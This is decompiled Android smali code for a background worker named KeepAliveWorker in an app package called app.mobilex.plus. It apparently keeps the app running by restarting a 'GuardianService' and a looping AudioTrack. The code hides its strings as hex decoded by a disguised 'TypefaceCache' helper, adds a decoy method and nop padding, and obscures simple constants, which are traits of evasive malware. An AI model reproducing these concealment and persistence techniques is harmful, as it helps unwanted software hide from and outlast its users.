.class public final Lapp/mobilex/plus/workers/KeepAliveWorker;
.super Landroidx/work/Worker;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"


# static fields
.field public static final xDyLpEZyrcKVe0:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 1
    const-string v0, "00080073005E009700D100B300DB00B1002600410054009500FB00BA00C0"

    .line 2
    .line 3
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 4
    .line 5
    .line 6
    const-string v0, "00280073005E009700F100B300DB00B100260049004C008800E200B400D700B5"

    .line 7
    .line 8
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 9
    .line 10
    .line 11
    move-result-object v0

    .line 12
    sput-object v0, Lapp/mobilex/plus/workers/KeepAliveWorker;->xDyLpEZyrcKVe0:Ljava/lang/String;

    .line 13
    .line 14
    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Landroidx/work/WorkerParameters;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1, p2}, Landroidx/work/Worker;-><init>(Landroid/content/Context;Landroidx/work/WorkerParameters;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method private static synthetic ffls()V
    .locals 1

    const-string v0, "net.data.gqderqspvx"

    const-string v0, "Settings"

    const-string v0, "onResume"

    const-string v0, "UTF-8"

    const-string v0, "Loading..."

    const-string v0, "BaseFragment"

    return-void
.end method


# virtual methods
.method public final xDyLpEZyrcKVe0()Lv/s/MdvPnR06eW9Un0O;
    .locals 3

    .line 1
    :try_start_0
    sget-object v0, Lapp/mobilex/plus/services/SyncQYAdapter;->ECwLkmPW1UKz7J6E:Ljava/lang/String;

    .line 2
    .line 3
    sget-object v0, Lapp/mobilex/plus/services/SyncQYAdapter;->VEkRsTDS6a9oHWI:Lapp/mobilex/plus/services/SyncQYAdapter;

    nop

    nop

    .line 4
    .line 5
    if-nez v0, :cond_0

    .line 6
    .line 7
    const-string v0, "0010006F0055008400C1008600F300A300220066004F008200E200FF00D600A200220072001700C700E200BA00C100B300220064004F008E00FE00B8"

    .line 8
    .line 9
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 10
    .line 11
    .line 12
    iget-object v0, p0, Lv/s/Qa4pJoqqkp7u;->dDIMxZXP1V8HdM:Landroid/content/Context;

    .line 13
    .line 14
    const-string v1, "00140059006900AC00D5008D00ED008C00060053006B00A600DC009600E40082"

    .line 15
    .line 16
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 17
    .line 18
    .line 19
    move-result-object v1

    .line 20
    invoke-static {v0, v1}, Lv/s/y6jRGLEWNMir;->Qrz92kRPw4GcghAc(Landroid/content/Context;Ljava/lang/String;)V

    .line 21
    .line 22
    .line 23
    goto :goto_0

    .line 24
    :catch_0
    move-exception v0

    nop

    nop

    .line 25
    goto/16 :goto_2

    .line 26
    :cond_0
    :goto_0
    sget-object v0, Lapp/mobilex/plus/services/GuardianService;->b1EoSIRjJHO5:Ljava/lang/String;

    .line 27
    .line 28
    iget-object v0, p0, Lv/s/Qa4pJoqqkp7u;->dDIMxZXP1V8HdM:Landroid/content/Context;

    .line 29
    .line 30
    invoke-static {v0}, Lv/s/okc5AGRjqrud84oM6d;->Qrz92kRPw4GcghAc(Landroid/content/Context;)V

    .line 31
    .line 32
    .line 33
    sget-object v0, Lv/s/kExylgSxUDTVQOx3o0oq;->dDIMxZXP1V8HdM:Lv/s/kExylgSxUDTVQOx3o0oq;

    nop

    nop

    .line 34
    .line 35
    sget-boolean v1, Lv/s/kExylgSxUDTVQOx3o0oq;->vekpFI4d1Nc4fakF:Z

    .line 36
    .line 37
    if-eqz v1, :cond_1

    .line 38
    .line 39
    sget-object v1, Lv/s/kExylgSxUDTVQOx3o0oq;->w9sT1Swbhx3hs:Landroid/media/AudioTrack;

    nop

    nop

    .line 40
    .line 41
    if-eqz v1, :cond_1

    .line 42
    .line 43
    invoke-virtual {v1}, Landroid/media/AudioTrack;->getPlayState()I

    .line 44
    .line 45
    .line 46
    move-result v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 47
    const/16 v2, 0x3

    .line 48
    if-ne v1, v2, :cond_1

    .line 49
    .line 50
    const/16 v1, -0x44

    nop

    add-int/lit8 v1, v1, 0x45

    .line 51
    goto :goto_1

    .line 52
    :cond_1
    const/16 v1, 0x0

    .line 53
    :goto_1
    if-nez v1, :cond_2

    .line 54
    .line 55
    :try_start_1
    iget-object v1, p0, Lv/s/Qa4pJoqqkp7u;->dDIMxZXP1V8HdM:Landroid/content/Context;

    .line 56
    .line 57
    invoke-virtual {v0, v1}, Lv/s/kExylgSxUDTVQOx3o0oq;->w9sT1Swbhx3hs(Landroid/content/Context;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 58
    .line 59
    .line 60
    goto/16 :goto_3

    .line 61
    :goto_2
    const-string v1, "00270079006C008800E200B4009200A2003100640054009500AA00FF"

    .line 62
    .line 63
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 64
    .line 65
    .line 66
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 67
    .line 68
    .line 69
    :catch_1
    :cond_2
    :goto_3
    invoke-static {}, Lv/s/MdvPnR06eW9Un0O;->dDIMxZXP1V8HdM()Lv/s/usXe12lhWsuJbBd0Y;

    .line 70
    .line 71
    .line 72
    move-result-object v0

    .line 73
    return-object v0
.end method
